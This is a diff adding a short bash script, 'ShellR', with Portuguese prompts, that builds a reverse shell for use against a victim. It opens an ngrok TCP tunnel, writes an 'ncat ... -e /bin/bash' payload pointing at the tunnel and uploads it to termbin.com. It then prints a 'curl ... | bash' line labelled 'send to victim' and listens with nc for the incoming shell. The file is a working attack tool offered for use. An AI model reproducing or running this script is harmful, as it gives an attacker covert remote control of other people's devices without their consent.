@@ -1,0 +1,60 @@
+#!/usr/bin/bash
+
+menu ()
+{
+       clear
+       echo "#=====================#"
+       echo "#       ShellR        #"
+       echo "#                     #"
+       echo "# Autoress: AthenaD3V #"
+       echo "#                     #"
+       echo "# Org: Albania-Sec    #"
+       echo "#                     #"
+       echo "#=====================#"
+       echo
+       echo -n "Digite a porta >> "; read port
+       echo
+       echo "Levantando servidor ngrok..."
+
+       ./ngrok tcp $port > /dev/null &
+       sleep 09
+       txt
+}
+
+txt ()
+{
+       curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep -o "[0-9]*\.tcp.ngrok.io" >> link.txt
+
+       curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep "public_url" | grep -o "[0-9][0-9][0-9]*" >> porta.txt
+
+       link=$(cat link.txt)
+
+       porta=$(cat porta.txt)
+
+       ip=$(host "$link" | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*")
+
+       echo "pkg install nmap-ncat -y && ncat $ip $porta -e /bin/bash" > athena.txt
+
+       send=$(cat athena.txt | nc termbin.com 9999)
+
+       shell
+}
+
+shell ()
+{
+       clear
+       echo
+       echo "Envie Para Vitima: curl -s $send | bash &"
+       echo
+       rm link.txt porta.txt athena.txt
+       netc
+}
+
+netc ()
+{
+       nc -lvp $port
+}
+
+######
+menu #
+######
